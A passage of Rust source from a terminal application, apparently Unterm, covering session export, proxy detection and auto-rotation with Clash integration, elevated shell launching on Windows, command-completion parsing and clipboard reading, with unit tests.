        let traces = engine.attach_recording_trace(pane_id, trace_id)?;
        Ok(json!({"trace_ids": traces}))
    }

    fn session_export_markdown(&self, params: &Value) -> Result<Value> {
        let engine = self.engine();
        let pane_id = self.resolve_pane_id(
            engine.as_ref(),
            params,
            PaneResolutionOptions::REQUIRED_EXISTING,
        )?;
        let path = params
            .get("path")
            .and_then(|v| v.as_str())
            .map(std::path::PathBuf::from);
        let status = engine.recording_status(pane_id)?;
        if status.enabled {
            let target_path = path.map(|path| path.display().to_string());
            let out = engine.export_markdown(pane_id, target_path)?;
            return Ok(json!({
                "session_id": out.session_id,
                "path": out.path,
                "bytes": out.bytes,
                "block_count": out.block_count,
            }));
        }

        let (dest, out) = {
            let project_path = engine.shell(pane_id)?.cwd;
            let scrollback = engine.read_scrollback_text(
                pane_id,
                ScrollbackTextRequest {
                    start_line: None,
                    end_line: None,
                    tail_lines: None,
                    escapes: false,
                },
            )?;
            unterm_services::recording::archive::export_scrollback_markdown_for_session(
                pane_id,
                project_path,
                scrollback.text,
                path,
            )?
        };

        Ok(json!({
            "session_id": uuid::Uuid::new_v4().to_string(),
            "path": dest.display().to_string(),
            "bytes": out.markdown.len(),
            "block_count": out.block_count,
        }))
    }
}

fn proxy_config_path() -> std::path::PathBuf {
    unterm_protocol::state_path("proxy.json")
        .unwrap_or_else(|| std::path::PathBuf::from(".unterm").join("proxy.json"))
}

fn load_proxy_settings() -> ProxySettings {
    let path = proxy_config_path();
    let mut settings: ProxySettings = match std::fs::read_to_string(&path) {
        Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
        Err(_) => ProxySettings::default(),
    };

    // Auto-refresh: when the user is in "auto" mode (or hasn't picked a
    // mode yet), re-run system_proxy::detect() at every load and overlay
    // its URLs over whatever stale values were on disk. This is what
    // makes "I changed Clash from 7890 to 7897" Just Work without the
    // user having to delete proxy.json by hand. Manual mode preserves
    // the user's explicit URLs untouched.
    //
    // We don't persist the refreshed URLs to disk — they're overlay-only.
    // That keeps the on-disk file as a record of *intent* (auto vs
    // manual + manual URLs if applicable), while in-memory state always
    // reflects what's actually reachable right now.
    let is_auto = settings.mode != "manual";
    if is_auto {
        if let Some(found) = unterm_services::system_proxy::detect() {
            settings.http_proxy = found.primary_http().map(|s| s.to_string());
            settings.socks_proxy = found.socks.clone();
            if !settings.no_proxy.is_empty() && found.no_proxy.as_deref().unwrap_or("").is_empty() {
                // Keep user's no_proxy if set; otherwise take detected.
            } else if let Some(np) = found.no_proxy.clone() {
                settings.no_proxy = np;
            }
        }
    }

    settings
}

/// Result of probing whether the configured (or auto-detected) proxy is
/// reachable. Returned in the `health` field of `proxy.status`.
fn probe_proxy_health(settings: &ProxySettings) -> Value {
    // 1. If the user supplied an explicit URL, probe that.
    if let Some(url) = settings
        .http_proxy
        .as_ref()
        .filter(|s| !s.is_empty())
        .or(settings.socks_proxy.as_ref().filter(|s| !s.is_empty()))
    {
        let alive = probe_proxy_endpoint(url, 200);
        return json!({
            "source": "manual",
            "url": url,
            "reachable": alive,
            "hint": if alive { "" } else { "configured proxy is not responding — start your proxy software or disable the toggle" },
        });
    }
    // 2. Otherwise rely on the auto-detect path.
    match unterm_services::system_proxy::detect() {
        Some(found) => json!({
            "source": found.source,
            "url": found.primary_http(),
            "socks": found.socks,
            "no_proxy": found.no_proxy,
            "reachable": true,
        }),
        None => json!({
            "source": "auto",
            "reachable": false,
            "hint": "no system proxy detected and no responsive proxy on common local ports (7897, 7890, 1087, …); start your Clash/V2Ray or set a system proxy in Settings",
        }),
    }
}

fn save_proxy_settings(settings: &ProxySettings) -> Result<()> {
    let path = proxy_config_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, serde_json::to_string_pretty(settings)?)?;
    Ok(())
}

fn probe_proxy_endpoint(url: &str, timeout_ms: u64) -> bool {
    let Some(rest) = url.split("://").nth(1) else {
        return false;
    };
    let host_port = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(rest)
        .rsplit('@')
        .next()
        .unwrap_or(rest);
    let mut parts = host_port.rsplitn(2, ':');
    let Some(port) = parts.next().and_then(|p| p.parse::<u16>().ok()) else {
        return false;
    };
    let host = parts.next().unwrap_or("127.0.0.1");
    let Ok(addrs) = (host, port).to_socket_addrs() else {
        return false;
    };
    let timeout = std::time::Duration::from_millis(timeout_ms);
    addrs
        .into_iter()
        .any(|addr| std::net::TcpStream::connect_timeout(&addr, timeout).is_ok())
}

/// Probe a node URL, returning `(reachable, latency_ms)`. Latency is the TCP
/// connect time in milliseconds, or `None` when unreachable. Used to fill the
/// live availability/latency the Web Settings rotation pool shows.
fn probe_node_latency(url: &str, timeout_ms: u64) -> (bool, Option<u64>) {
    let Some(rest) = url.split("://").nth(1) else {
        return (false, None);
    };
    let host_port = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(rest)
        .rsplit('@')
        .next()
        .unwrap_or(rest);
    let mut parts = host_port.rsplitn(2, ':');
    let Some(port) = parts.next().and_then(|p| p.parse::<u16>().ok()) else {
        return (false, None);
    };
    let host = parts.next().unwrap_or("127.0.0.1");
    let Ok(addrs) = (host, port).to_socket_addrs() else {
        return (false, None);
    };
    let timeout = std::time::Duration::from_millis(timeout_ms);
    for addr in addrs {
        let start = std::time::Instant::now();
        if std::net::TcpStream::connect_timeout(&addr, timeout).is_ok() {
            return (true, Some(start.elapsed().as_millis() as u64));
        }
    }
    (false, None)
}

/// Pick the fastest reachable node named in `pool` from `nodes`. `probe`
/// returns `Some(latency_ms)` if a node's URL is reachable, `None` if it's
/// down. Pure selection so it's unit-testable without touching the network.
fn select_fastest_node<'a>(
    nodes: &'a [ProxyNodeConfig],
    pool: &[String],
    probe: impl Fn(&str) -> Option<u64>,
) -> Option<&'a ProxyNodeConfig> {
    let mut best: Option<(&ProxyNodeConfig, u64)> = None;
    for name in pool {
        if let Some(node) = nodes.iter().find(|n| &n.name == name) {
            if let Some(latency) = probe(&node.url) {
                if best.as_ref().map_or(true, |(_, b)| latency < *b) {
                    best = Some((node, latency));
                }
            }
        }
    }
    best.map(|(n, _)| n)
}

#[cfg(test)]
mod proxy_rotation_tests {
    use super::*;

    fn node(name: &str, url: &str) -> ProxyNodeConfig {
        ProxyNodeConfig {
            name: name.into(),
            url: url.into(),
            latency_ms: None,
            available: false,
        }
    }

    #[test]
    fn picks_fastest_reachable_skips_down_and_unknown() {
        let nodes = vec![
            node("a", "http://a:1"),
            node("b", "http://b:2"),
            node("c", "http://c:3"),
        ];
        // pool includes a missing name; "a" is down, "b" slow, "c" fastest.
        let pool = vec!["a".into(), "b".into(), "missing".into(), "c".into()];
        let pick = select_fastest_node(&nodes, &pool, |url| match url {
            "http://a:1" => None,     // unreachable → skipped
            "http://b:2" => Some(80), // reachable, slower
            "http://c:3" => Some(20), // reachable, fastest → winner
            _ => None,
        });
        assert_eq!(pick.map(|n| n.name.as_str()), Some("c"));
    }

    #[test]
    fn none_when_pool_all_down_or_empty() {
        let nodes = vec![node("a", "http://a:1")];
        assert!(select_fastest_node(&nodes, &["a".into()], |_| None).is_none());
        assert!(select_fastest_node(&nodes, &[], |_| Some(5)).is_none());
        // a pool name that isn't in nodes resolves to nothing.
        assert!(select_fastest_node(&nodes, &["ghost".into()], |_| Some(5)).is_none());
    }

    /// The core of the "rotation keeps dropping my network" fix: a single missed
    /// health check must NOT cross the failover threshold; only repeated misses
    /// on the same node do, and any success / node change resets the count.
    #[test]
    fn failover_debounces_until_consecutive_failures() {
        // The fix only makes sense if more than one miss is required.
        assert!(
            ROTATION_FAILS_BEFORE_SWITCH >= 2,
            "a single jittery probe must never trigger a switch"
        );
        rotation_reset_failure();

        // One miss: recorded, but below the switch threshold → hold, don't switch.
        let first = rotation_note_failure("node-A");
        assert_eq!(first, 1);
        assert!(first < ROTATION_FAILS_BEFORE_SWITCH);

        // Consecutive misses on the same node accumulate up to the threshold.
        let mut count = first;
        while count < ROTATION_FAILS_BEFORE_SWITCH {
            count = rotation_note_failure("node-A");
        }
        assert!(
            count >= ROTATION_FAILS_BEFORE_SWITCH,
            "repeated misses must fail over"
        );

        // A healthy probe (or a completed switch) clears the strike count.
        rotation_reset_failure();
        assert_eq!(
            rotation_note_failure("node-A"),
            1,
            "reset must wipe accumulated failures"
        );

        // A different active node starts fresh — it inherits no strikes from the
        // node we just left, so it can't be condemned on its first miss.
        assert_eq!(
            rotation_note_failure("node-B"),
            1,
            "a new active node starts with a clean slate"
        );
        rotation_reset_failure();
    }
}

/// Endpoint-level proxy failover (one check). If auto-rotation is on and the
/// active node is unreachable, probe the pool and switch to the fastest live
/// node. Software-agnostic: a "node" is just an HTTP/SOCKS URL, probed by TCP —
/// works with any proxy app (Clash/Mihomo, V2Ray, sing-box, remote SOCKS, …).
/// Reuses the same probe + persistence as the manual proxy methods so a rotated
/// switch is indistinguishable from a hand switch. Returns the node switched to.
/// Extract `(alive, last_delay_ms)` from a Clash proxy node object. A node with
/// a last-history delay of 0 (mihomo's "timed out" sentinel) reads as down.
fn node_health(obj: &Value) -> (bool, Option<u64>) {
    let delay = obj
        .get("history")
        .and_then(|h| h.as_array())
        .and_then(|arr| arr.last())
        .and_then(|e| e.get("delay"))
        .and_then(|d| d.as_u64())
        .filter(|d| *d > 0);
    let alive = obj
        .get("alive")
        .and_then(|a| a.as_bool())
        .unwrap_or(delay.is_some());
    (alive, delay)
}

/// Resolve the Clash/mihomo controller to talk to: the user's manual override
/// (if set and reachable) wins, otherwise fall back to auto-discovery. The
/// manual override is the escape hatch for Windows / non-standard setups.
fn resolve_clash_endpoint(
    settings: &ProxySettings,
) -> Option<unterm_services::clash_api::ClashEndpoint> {
    if !settings.clash_controller.trim().is_empty() {
        let ep = unterm_services::clash_api::manual_endpoint(
            &settings.clash_controller,
            &settings.clash_secret,
        );
        if unterm_services::clash_api::version(&ep).is_ok() {
            return Some(ep);
        }
    }
    unterm_services::clash_api::discover_cached()
}

/// Consecutive failed health-check ticks for the rotation's *current* node.
/// Reset to 0 the instant a probe succeeds or we switch. This is the guard that
/// keeps a single slow/jittery probe from yanking the proxy exit out from under
/// live connections — the root cause of "rotation keeps dropping my network."
/// Only the single rotation-monitor thread touches it, so a plain Mutex is fine.
static ROTATION_FAILS: std::sync::Mutex<(String, u32)> = std::sync::Mutex::new((String::new(), 0));

/// How many consecutive ticks (each already retried within the tick) the active
/// node must miss before we fail over. With the default 30s interval that's a
/// ~1 min grace window — long enough to ride out latency spikes, short enough
/// to recover from a genuinely dead node.
const ROTATION_FAILS_BEFORE_SWITCH: u32 = 2;

/// Note a failed health-check tick for `node`; returns the new consecutive
/// count. Resets first when the active node changed since the last tick (so a
/// new node starts with a clean slate). Fails open (returns the switch
/// threshold) if the lock is poisoned, so a poisoned mutex can't wedge failover.
fn rotation_note_failure(node: &str) -> u32 {
    let Ok(mut g) = ROTATION_FAILS.lock() else {
        return ROTATION_FAILS_BEFORE_SWITCH;
    };
    if g.0 != node {
        g.0 = node.to_string();
        g.1 = 0;
    }
    g.1 += 1;
    g.1
}

/// Clear the failure counter — the active node is healthy again, or we just
/// switched to a fresh one.
fn rotation_reset_failure() {
    if let Ok(mut g) = ROTATION_FAILS.lock() {
        g.0.clear();
        g.1 = 0;
    }
}

/// Delay-test a clash node, retrying once so a single jittery probe doesn't read
/// as "dead." Alive if any attempt returns a positive delay. A genuinely dead
/// node fails both attempts within the same tick; a merely slow one usually
/// passes on the retry.
fn clash_node_alive(
    ep: &unterm_services::clash_api::ClashEndpoint,
    name: &str,
    url: &str,
    timeout_ms: u64,
) -> bool {
    (0..2).any(
        |_| matches!(unterm_services::clash_api::delay(ep, name, url, timeout_ms), Ok(d) if d > 0),
    )
}

/// One clash-mode failover cycle: if the group's current node is unreachable,
/// delay-test the pool and switch the group to the fastest live node.
fn clash_rotation_tick(settings: &ProxySettings) -> Option<String> {
    const PROBE_TIMEOUT_MS: u64 = 5000;
    let group = &settings.rotation.group;
    let pool = &settings.rotation.pool;
    if pool.is_empty() {
        return None;
    }
    let ep = resolve_clash_endpoint(settings)?;
    let url = unterm_services::clash_api::DELAY_TEST_URL;

    // Current selection of the group.
    let proxies = unterm_services::clash_api::proxies(&ep).ok()?;
    let now = proxies
        .get(group)
        .and_then(|g| g.get("now"))
        .and_then(|n| n.as_str())
        .map(str::to_string);

    // If the current node is in the pool, only fail over once it has missed its
    // health check on REPEATED ticks. Switching a selector changes the exit for
    // every connection routed through it, so a single slow probe must never
    // trigger a switch — that is precisely the "rotation dropped my network"
    // symptom. Retry within the tick (clash_node_alive) to absorb jitter, then
    // require ROTATION_FAILS_BEFORE_SWITCH consecutive failing ticks.
    if let Some(cur) = &now {
        if pool.contains(cur) {
            if clash_node_alive(&ep, cur, url, PROBE_TIMEOUT_MS) {
                rotation_reset_failure();
                return None; // healthy — stay put
            }
            let fails = rotation_note_failure(cur);
            if fails < ROTATION_FAILS_BEFORE_SWITCH {
                log::debug!(
                    "proxy rotation (clash): '{cur}' missed health check {fails}/{ROTATION_FAILS_BEFORE_SWITCH}, holding"
                );
                return None; // give it another tick before yanking the exit
            }
            log::info!(
                "proxy rotation (clash): '{cur}' failed {fails} consecutive checks → failing over"
            );
        }
    }

    // Pick the fastest live node in the pool.
    let mut best: Option<(String, u64)> = None;
    for name in pool {
        if let Ok(d) = unterm_services::clash_api::delay(&ep, name, url, PROBE_TIMEOUT_MS) {
            if d > 0 && best.as_ref().map_or(true, |(_, b)| d < *b) {
                best = Some((name.clone(), d));
            }
        }
    }
    let (pick, ms) = best?;
    if now.as_deref() == Some(pick.as_str()) {
        rotation_reset_failure(); // current is still the fastest live node
        return None;
    }
    unterm_services::clash_api::select(&ep, group, &pick).ok()?;
    rotation_reset_failure();
    log::info!("proxy auto-rotation (clash): group '{group}' → '{pick}' ({ms}ms)");
    Some(pick)
}

pub fn proxy_rotation_tick() -> Option<String> {
    const PROBE_TIMEOUT_MS: u64 = 5000;
    let mut state = mcp_state().lock();
    let mut settings = state.proxy.clone();
    if !settings.rotation.enabled {
        return None;
    }
    // Clash mode: rotation is driven through the proxy software's controller.
    if !settings.rotation.group.is_empty() {
        drop(state); // network I/O; don't hold the state lock
        return clash_rotation_tick(&settings);
    }
    if settings.rotation.pool.is_empty() {
        return None;
    }

    // Active node still reachable? Retry once to ride out transient jitter, and
    // require ROTATION_FAILS_BEFORE_SWITCH consecutive failing ticks before
    // swapping the injected proxy — a single missed probe must not flip the
    // exit out from under the user.
    if let Some((cur_name, cur_url)) = settings.current_node.as_ref().and_then(|cn| {
        settings
            .nodes
            .iter()
            .find(|n| &n.name == cn)
            .map(|n| (cn.clone(), n.url.clone()))
    }) {
        if (0..2).any(|_| probe_proxy_endpoint(&cur_url, PROBE_TIMEOUT_MS)) {
            rotation_reset_failure();
            return None; // healthy — nothing to do
        }
        let fails = rotation_note_failure(&cur_name);
        if fails < ROTATION_FAILS_BEFORE_SWITCH {
            log::debug!(
                "proxy rotation: '{cur_name}' missed health check {fails}/{ROTATION_FAILS_BEFORE_SWITCH}, holding"
            );
            return None;
        }
        log::info!("proxy rotation: '{cur_name}' failed {fails} consecutive checks → failing over");
    }

    // Active node down (or unset): probe the pool, pick the fastest reachable.
    let target = select_fastest_node(&settings.nodes, &settings.rotation.pool, |url| {
        let start = std::time::Instant::now();
        probe_proxy_endpoint(url, PROBE_TIMEOUT_MS).then(|| start.elapsed().as_millis() as u64)
    });
    let (name, url) = match target {
        Some(node) => (node.name.clone(), node.url.clone()),
        None => return None, // nothing in the pool is reachable — stay put
    };

    settings.enabled = true;
    settings.mode = "auto".to_string();
    settings.current_node = Some(name.clone());
    settings.http_proxy = Some(url.clone());
    if url.starts_with("socks") {
        settings.socks_proxy = Some(url.clone());
    }
    if save_proxy_settings(&settings).is_ok() {
        state.proxy = settings;
        rotation_reset_failure();
        log::info!("proxy auto-rotation: active node unreachable → switched to '{name}' ({url})");
        Some(name)
    } else {
        None
    }
}

/// Spawn the background auto-rotation monitor. Re-reads the interval each cycle
/// so live config changes take effect; cheap when disabled (a lock + two field
/// reads). Min 5s to avoid hammering. Started once at GUI startup.
pub fn start_proxy_rotation_monitor() {
    std::thread::Builder::new()
        .name("proxy-rotation".into())
        .spawn(|| loop {
            let interval = mcp_state().lock().proxy.rotation.interval_secs.max(10);
            std::thread::sleep(std::time::Duration::from_secs(interval));
            proxy_rotation_tick();
        })
        .ok();
}

#[cfg(windows)]
fn elevated_unterm_command_args(shell: &str) -> Result<Vec<String>> {
    let gui_exe = std::env::current_exe().context("resolve current Unterm GUI executable")?;
    let gui_exe = admin_launcher_exe(&gui_exe);
    let shell_args: Vec<String> = match shell.to_ascii_lowercase().as_str() {
        "powershell" | "windows-powershell" | "windows_powershell" => {
            vec!["powershell.exe".to_string(), "-NoLogo".to_string()]
        }
        "pwsh" | "powershell7" | "powershell-7" | "powershell_7" => {
            let pwsh = "C:\\Program Files\\PowerShell\\7\\pwsh.exe";
            if std::path::Path::new(pwsh).exists() {
                vec![pwsh.to_string(), "-NoLogo".to_string()]
            } else {
                vec!["powershell.exe".to_string(), "-NoLogo".to_string()]
            }
        }
        other => return Err(anyhow!("Unsupported elevated shell: {other}")),
    };

    let script = r#"
$exe = $args[0]
$argv = @()
if ($args.Length -gt 1) {
  $argv = $args[1..($args.Length - 1)]
}
Start-Process -Verb RunAs -FilePath $exe -ArgumentList $argv
"#;

    let mut args = vec![
        "powershell.exe".to_string(),
        "-NoProfile".to_string(),
        "-ExecutionPolicy".to_string(),
        "Bypass".to_string(),
        "-Command".to_string(),
        script.to_string(),
        gui_exe.display().to_string(),
        "start".to_string(),
        "--always-new-process".to_string(),
        "--".to_string(),
    ];
    args.extend(shell_args);
    Ok(args)
}

#[cfg(windows)]
fn admin_launcher_exe(gui_exe: &std::path::Path) -> std::path::PathBuf {
    let Some(dir) = gui_exe.parent() else {
        return gui_exe.to_path_buf();
    };
    let launcher = dir.join("Unterm.exe");
    let should_copy = match (std::fs::metadata(gui_exe), std::fs::metadata(&launcher)) {
        (Ok(src), Ok(dst)) => src.len() != dst.len() || src.modified().ok() != dst.modified().ok(),
        (Ok(_), Err(_)) => true,
        _ => false,
    };

    if should_copy {
        if let Err(err) = std::fs::copy(gui_exe, &launcher) {
            log::warn!(
                "failed to prepare Unterm.exe admin launcher at {}: {err:#}",
                launcher.display()
            );
        }
    }

    if launcher.exists() {
        launcher
    } else {
        gui_exe.to_path_buf()
    }
}

/// Extract new output by comparing before/after screen text
fn diff_output(before: &str, after: &str) -> String {
    let before_lines: Vec<&str> = before.lines().collect();
    let after_lines: Vec<&str> = after.lines().collect();

    // Find where they diverge
    let common_prefix = before_lines
        .iter()
        .zip(after_lines.iter())
        .take_while(|(a, b)| a == b)
        .count();

    // New content is everything after the common prefix, minus the last line (prompt)
    let new_lines: Vec<&str> = after_lines[common_prefix..].to_vec();
    if new_lines.is_empty() {
        return String::new();
    }

    // Skip the command echo (first new line) and the new prompt (last line)
    let output_lines = if new_lines.len() > 2 {
        &new_lines[1..new_lines.len() - 1]
    } else if new_lines.len() > 1 {
        &new_lines[1..]
    } else {
        &new_lines[..]
    };

    output_lines.join("\n")
}

fn wait_wrapped_command(command: &str, shell_type: &str, marker: &str) -> String {
    match shell_type {
        "powershell" => format!("{}; Write-Output '{}'", command, marker),
        "cmd" => format!("{} & echo {}", command, marker),
        _ => format!("{}; echo {}", command, marker),
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ResolvedWaitShell {
    kind: String,
    source: String,
}

fn resolve_exec_wait_shell(
    shell: &ShellSnapshot,
    activity: Option<&SessionActivitySnapshot>,
) -> ResolvedWaitShell {
    if shell.shell_type != "unknown" {
        return ResolvedWaitShell {
            kind: shell.shell_type.clone(),
            source: "shell.shell_type".to_string(),
        };
    }

    let candidates = [
        ("shell.process_name", Some(shell.process_name.as_str())),
        (
            "activity.process.root_process",
            activity
                .and_then(|activity| activity.process.as_ref())
                .map(|process| process.root_process.as_str()),
        ),
        (
            "activity.process.foreground_process",
            activity
                .and_then(|activity| activity.process.as_ref())
                .map(|process| process.foreground_process.as_str()),
        ),
        (
            "activity.foreground_process",
            activity.map(|activity| activity.foreground_process.as_str()),
        ),
    ];
    for (source, candidate) in candidates {
        if let Some(kind) = candidate.and_then(detect_wait_shell_from_process_name) {
            return ResolvedWaitShell {
                kind,
                source: source.to_string(),
            };
        }
    }

    ResolvedWaitShell {
        kind: default_wait_shell().to_string(),
        source: "platform.default".to_string(),
    }
}

fn detect_wait_shell_from_process_name(process_name: &str) -> Option<String> {
    let bare = process_name
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(process_name)
        .to_ascii_lowercase();
    let bare = bare.trim_end_matches(".exe");
    if bare.contains("powershell") || bare == "pwsh" {
        Some("powershell".to_string())
    } else if bare == "cmd" || bare == "cmd32" || bare == "cmd64" {
        Some("cmd".to_string())
    } else if matches!(bare, "bash" | "zsh" | "fish" | "sh" | "dash" | "ksh") {
        Some("posix".to_string())
    } else {
        None
    }
}

fn default_wait_shell() -> &'static str {
    if cfg!(windows) {
        "cmd"
    } else {
        "posix"
    }
}

fn contains_ignoring_line_breaks(text: &str, needle: &str) -> bool {
    if text.contains(needle) {
        return true;
    }
    text.chars()
        .filter(|ch| !matches!(ch, '\r' | '\n'))
        .collect::<String>()
        .contains(needle)
}

fn strip_ignoring_line_breaks(text: &str, needle: &str) -> String {
    if needle.is_empty() {
        return text.to_string();
    }

    let chars: Vec<char> = text.chars().collect();
    let wanted: Vec<char> = needle.chars().collect();
    let mut output = String::with_capacity(text.len());
    let mut index = 0;
    while index < chars.len() {
        let mut cursor = index;
        let mut matched = 0;
        while cursor < chars.len() && matched < wanted.len() {
            if matches!(chars[cursor], '\r' | '\n') {
                cursor += 1;
                continue;
            }
            if chars[cursor] != wanted[matched] {
                break;
            }
            cursor += 1;
            matched += 1;
        }
        if matched == wanted.len() {
            index = cursor;
        } else {
            output.push(chars[index]);
            index += 1;
        }
    }
    output
}

fn extract_wait_output(before: &str, after: &str, command: &str, marker: &str) -> String {
    let after = strip_ignoring_line_breaks(after, marker);
    let diff = diff_output(before, &after);
    let mut lines = Vec::new();

    for line in diff.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.contains(marker) {
            continue;
        }
        if trimmed.contains(command) {
            continue;
        }
        lines.push(trimmed.to_string());
    }

    if !lines.is_empty() {
        return lines.join("\n");
    }

    after
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .filter(|line| !line.contains(marker))
        .filter(|line| !line.contains(command))
        .filter(|line| !before.contains(line))
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod exec_wait_tests {
    use super::{
        contains_ignoring_line_breaks, extract_wait_output, resolve_exec_wait_shell,
        strip_ignoring_line_breaks,
    };
    use unterm_engine::{LaunchContextSnapshot, ProcessTreeSnapshot};
    use unterm_engine::{SessionActivitySnapshot, ShellSnapshot};

    #[test]
    fn completion_marker_survives_narrow_pane_wrapping() {
        let marker = "__UNTERM_DONE_0123456789abcdef__";
        let wrapped = "output\n__UNTERM_DONE_012345\n6789abcdef__\nPS>";
        assert!(contains_ignoring_line_breaks(wrapped, marker));
        assert_eq!(strip_ignoring_line_breaks(wrapped, marker), "output\nPS>");
    }

    #[test]
    fn wrapped_marker_is_not_returned_as_command_output() {
        let marker = "__UNTERM_DONE_0123456789abcdef__";
        let after = "PS> command\nRIGHT_PANE_OK\n__UNTERM_DONE_012345\n6789abcdef__\nPS>";
        let output = extract_wait_output("PS>", after, "command", marker);
        assert_eq!(output, "RIGHT_PANE_OK");
    }

    #[test]
    fn wait_shell_uses_engine_shell_type_when_available() {
        let shell = shell_snapshot("powershell", "codex.exe");
        let resolved = resolve_exec_wait_shell(&shell, None);
        assert_eq!(resolved.kind, "powershell");
        assert_eq!(resolved.source, "shell.shell_type");
    }

    #[test]
    fn wait_shell_falls_back_to_process_tree_root_for_agent_foreground() {
        let shell = shell_snapshot("unknown", "codex.exe");
        let activity = SessionActivitySnapshot {
            idle: false,
            foreground_process: "codex.exe".to_string(),
            process: Some(ProcessTreeSnapshot {
                root_pid: Some(10),
                root_process: "C:\\Windows\\System32\\cmd.exe".to_string(),
                root_cwd: None,
                foreground_pid: Some(11),
                foreground_process: "codex.exe".to_string(),
                foreground_cwd: None,
                foreground_argv: Vec::new(),
                child_count: 1,
                detected_agent: Some("codex".to_string()),
            }),
            input: None,
            output: None,
            paste: None,
            screen: None,
        };
        let resolved = resolve_exec_wait_shell(&shell, Some(&activity));
        assert_eq!(resolved.kind, "cmd");
        assert_eq!(resolved.source, "activity.process.root_process");
    }

    #[test]
    fn wait_shell_defaults_to_windows_cmd_or_posix_without_process_signal() {
        let shell = shell_snapshot("unknown", "codex.exe");
        let resolved = resolve_exec_wait_shell(&shell, None);
        assert_eq!(resolved.kind, if cfg!(windows) { "cmd" } else { "posix" });
        assert_eq!(resolved.source, "platform.default");
    }

    fn shell_snapshot(shell_type: &str, process_name: &str) -> ShellSnapshot {
        ShellSnapshot {
            shell_type: shell_type.to_string(),
            process_name: process_name.to_string(),
            cwd: None,
            launch_env_keys: Vec::new(),
            launch_context: LaunchContextSnapshot::default(),
        }
    }
}

// ---------------------------------------------------------------------------
// Capture helpers — cross-platform plumbing
// ---------------------------------------------------------------------------

fn capture_output_dir() -> Result<std::path::PathBuf> {
    let dir = unterm_protocol::state_dir()
        .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
        .join("screenshots");
    std::fs::create_dir_all(&dir).context("create screenshots output dir")?;
    Ok(dir)
}

fn append_base64_if_requested(mut value: Value, include_base64: bool) -> Result<Value> {
    if include_base64 {
        if let Some(path) = value.get("path").and_then(|v| v.as_str()) {
            let bytes = std::fs::read(path)?;
            value["base64"] = json!(base64::engine::general_purpose::STANDARD.encode(bytes));
        }
    }
    Ok(value)
}

#[cfg(all(unix, not(target_os = "macos")))]
fn unix_command_exists(name: &str) -> bool {
    let Some(path_var) = std::env::var_os("PATH") else {
        return false;
    };
    for dir in std::env::split_paths(&path_var) {
        if dir.join(name).is_file() {
            return true;
        }
    }
    false
}

// ---------------------------------------------------------------------------
// Cross-platform clipboard.read entry point
// ---------------------------------------------------------------------------

fn clipboard_read_any() -> Result<Value> {
    #[cfg(windows)]
    {
        return clipboard_read_win32();
    }
    #[cfg(target_os = "macos")]
    {
        return clipboard_read_macos();
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        return clipboard_read_linux();
    }
    #[allow(unreachable_code)]
    Err(anyhow!(
        "Clipboard reading is not supported on this platform"
    ))
}

// ---------------------------------------------------------------------------
// Windows implementations (PowerShell + Win32 API)
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn masked_channel(pixel: u32, mask: u32, default: u8) -> u8 {
    if mask == 0 {
        return default;
    }
    let shift = mask.trailing_zeros();
    let max = mask >> shift;
    let value = (pixel & mask) >> shift;
    (((value as u64 * 255) + (max as u64 / 2)) / max as u64) as u8
}

#[cfg(all(test, windows))]
mod clipboard_dib_tests {
    use super::masked_channel;

    #[test]
    fn decodes_standard_bgra_bitfield_masks() {
        let pixel = 0x7f_12_80_f0;
        assert_eq!(masked_channel(pixel, 0x00ff_0000, 0), 0x12);
        assert_eq!(masked_channel(pixel, 0x0000_ff00, 0), 0x80);
        assert_eq!(masked_channel(pixel, 0x0000_00ff, 0), 0xf0);
        assert_eq!(masked_channel(pixel, 0xff00_0000, 255), 0x7f);
        assert_eq!(masked_channel(pixel, 0, 255), 255);
    }
}

/// Read clipboard content using Win32 API.
/// Supports both text (CF_UNICODETEXT) and image (CF_DIB) formats.
/// IMPORTANT: Do NOT use PowerShell for clipboard access — it steals window focus.
#[cfg(windows)]
fn clipboard_read_win32() -> Result<Value> {
    use std::ptr;
    use winapi::shared::minwindef::HGLOBAL;
    use winapi::um::winbase::{GlobalLock, GlobalSize, GlobalUnlock};
    use winapi::um::wingdi::BITMAPINFOHEADER;
    use winapi::um::winuser::{
        CloseClipboard, GetClipboardData, IsClipboardFormatAvailable, OpenClipboard, CF_DIB,
        CF_UNICODETEXT,
    };

    let has_image = unsafe { IsClipboardFormatAvailable(CF_DIB as u32) != 0 };
    let has_text = unsafe { IsClipboardFormatAvailable(CF_UNICODETEXT as u32) != 0 };

    if !has_image && !has_text {
        return Err(anyhow!("Clipboard is empty or contains unsupported format"));
    }

    let opened = unsafe { OpenClipboard(ptr::null_mut()) };
    if opened == 0 {
        return Err(anyhow!(
            "Failed to open clipboard (it may be locked by another application)"
        ));
    }

    struct ClipboardGuard;
    impl Drop for ClipboardGuard {
        fn drop(&mut self) {
            unsafe {
                CloseClipboard();
            }
        }
    }
    let _guard = ClipboardGuard;

    if has_image {
        let handle: HGLOBAL = unsafe { GetClipboardData(CF_DIB as u32) as HGLOBAL };
        if !handle.is_null() {
            let ptr = unsafe { GlobalLock(handle) };
            if ptr.is_null() {
                return Err(anyhow!("GlobalLock failed on clipboard DIB data"));
            }

            let data_size = unsafe { GlobalSize(handle) };
            if data_size < std::mem::size_of::<BITMAPINFOHEADER>() {
                unsafe {
                    GlobalUnlock(handle);
                }
                return Err(anyhow!("Clipboard DIB data too small"));
            }

            let bih = unsafe { &*(ptr as *const BITMAPINFOHEADER) };
            let width = bih.biWidth.unsigned_abs();
            let height_signed = bih.biHeight;
            let height = height_signed.unsigned_abs();
            let bit_count = bih.biBitCount;
            let compression = bih.biCompression;

            // BI_RGB (0) is the classic packed BGR/BGRA layout. Windows and
            // .NET commonly publish 32-bit clipboard images as BI_BITFIELDS
            // (3), with explicit RGB masks following a 40-byte header (or
            // embedded in V4/V5 headers).
            if compression != 0 && compression != 3 {
                unsafe {
                    GlobalUnlock(handle);
                }
                return Err(anyhow!(
